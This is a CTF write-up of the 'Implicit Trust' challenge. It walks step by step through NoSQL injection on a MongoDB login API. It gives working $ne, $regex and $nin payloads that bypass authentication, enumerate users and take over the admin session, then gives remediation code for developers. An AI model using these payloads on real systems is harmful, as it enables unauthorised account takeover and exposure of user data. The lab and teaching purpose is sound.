# 🔍 CTF Walkthrough — Authentication Bypass via NoSQL Injection

> **Challenge:** Defhawk — Implicit Trust  
> **Category:** Jeopardy — Web Exploitation  
> **Stack:** React.js · Next.js · Node.js · MongoDB  
> **Difficulty:** Intermediate

---

## 🧠 Background Research

Before touching the application, I researched NoSQL Injection to understand:

- **What it is:** Injecting MongoDB operators (`$ne`, `$gt`, `$regex`, `$nin`) into JSON request bodies to manipulate query logic
- **Why it works:** Applications pass unsanitised JSON directly to the MongoDB driver without validating field types
- **What's possible:** Authentication bypass, user enumeration, data extraction, DoS, and server-side JS execution

---

## 🔎 Phase 1 — Reconnaissance & Enumeration

### Step 1 — Open the Application & Inspect Traffic

1. Open the target web app in your browser
2. Right-click → **Inspect** → go to **Network** tab
3. Submit the login form with any credentials
4. Observe the request captured in the Network tab

**Vulnerable endpoint found:**
```
POST /api/v2/auth/signin
```

Request body (JSON):
```json
{
  "userID": "admin@gmail.com",
  "password": "test123"
}
```

Response (normal wrong credentials):
```json
{"message": "Invalid credentials."}
```

### Step 2 — Source Code Inspection

Also checked the page's `.js` bundle files in DevTools → **Sources** tab.  
Found additional API paths referenced in the JavaScript:
```
GET /api/v2/account/details
```
This endpoint returns account info if authenticated — useful for post-exploitation.

---

## ⚔️ Phase 2 — Exploitation

### Step 3 — Set Up Burp Suite

1. Open **Burp Suite** → turn on **Intercept**
2. Configure browser proxy: `127.0.0.1:8080`
3. Submit login form → Burp captures the `POST` request
4. Right-click → **Send to Repeater** (`Ctrl+R`)
5. Turn **Intercept off** so normal browsing continues

### Step 4 — Confirm Vulnerability (Testing `$ne`)

In Burp **Repeater**, change the JSON body to:

```json
{"userID": {"$ne": "x"}, "password": {"$ne": "x"}}
```

Also set the `Content-Type` header:
```
Content-Type: application/json
```

Click **Send**.

**✅ Response:**
```json
{"message": "Login successful!"}
```
A `sessToken` cookie is set in the response — **authentication bypassed!**

> 💡 **Why this works:** MongoDB evaluates the query as:  
> `WHERE userID != "x" AND password != "x"` → matches the first document in the collection (admin)

### Step 5 — Target Admin Specifically

To target the admin account directly:

```json
{"userID": {"$regex": "admin"}, "password": {"$ne": "x"}}
```

`$regex` tells MongoDB to match any `userID` that contains the string `admin`.

---

## 👥 Phase 3 — User Enumeration with `$nin`

The `$nin` ("not in") operator lets you exclude known userIDs, forcing MongoDB to return the **next** user in the collection.

### Round 1 — Get First User
```json
{"userID": {"$ne": "x"}, "password": {"$ne": "x"}}
```
→ Returns `admin` account with a `sessToken`

### Round 2 — Exclude Admin, Get Next
```json
{"userID": {"$nin": ["admin"]}, "password": {"$ne": "x"}}
```
→ Returns next user (e.g., `dave@gmail.com`)

### Round 3 — Stack Exclusions
```json
{"userID": {"$nin": ["admin", "dave@gmail.com"]}, "password": {"$ne": "x"}}
```
→ Returns next user (e.g., `jude@gmail.com`)

### Round 4 — Continue Stacking
```json
{"userID": {"$nin": ["admin", "dave@gmail.com", "jude@gmail.com"]}, "password": {"$ne": "x"}}
```

### ✋ When to Stop

Stop when response returns:
```
401 Unauthorized — {"message": "Invalid credentials."}
```
No more accounts exist in the collection.

---

## 🏁 Phase 4 — Post-Exploitation (Account Takeover)

Using the `sessToken` from the admin login:

### Step 6 — Access Account Details

In Burp Repeater, send:
```
GET /api/v2/account/details HTTP/1.1
Host: <target>
Cookie: sessToken=<token_from_login_response>
```

**Response:**
```json
{
  "accountHolder": "Saurabh Sharma",
  "emailID": "admin@gmail.com",
  "email": "admin@gmail.com"
}
```

✅ **Full admin account takeover confirmed — without knowing the password.**

---

## 🔑 JWT Token Analysis

After bypassing auth, inspect the `sessToken` — it is a **JWT (JSON Web Token)**.

Decode it at [jwt.io](https://jwt.io) to see the payload:
```json
{
  "userID": "admin",
  "role": "admin",
  "iat": 1746000000,
  "exp": 1746086400
}
```

This confirms the session belongs to the admin role.

---

## 📌 Key Takeaways

| Finding | Detail |
|---------|--------|
| Vulnerable endpoint | `POST /api/v2/auth/signin` |
| Injection point | `userID` and `password` JSON fields |
| Operators used | `$ne`, `$regex`, `$nin` |
| Impact | Full authentication bypass, account takeover, user enumeration |
| Root cause | No input type validation — objects accepted where strings expected |

---

## 🛡️ Remediation for Developers

```javascript
// ❌ VULNERABLE — no type check
const user = await User.findOne({ userID: req.body.userID, password: req.body.password });

// ✅ FIXED — enforce string type
const { userID, password } = req.body;
if (typeof userID !== 'string' || typeof password !== 'string') {
  return res.status(400).json({ message: 'Invalid input.' });
}
const user = await User.findOne({ userID, password });
```

Also use a library like **`express-mongo-sanitize`** to strip `$` operators automatically:
```bash
npm install express-mongo-sanitize
```
```javascript
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize()); // strips $ keys from req.body, req.params, req.query
```
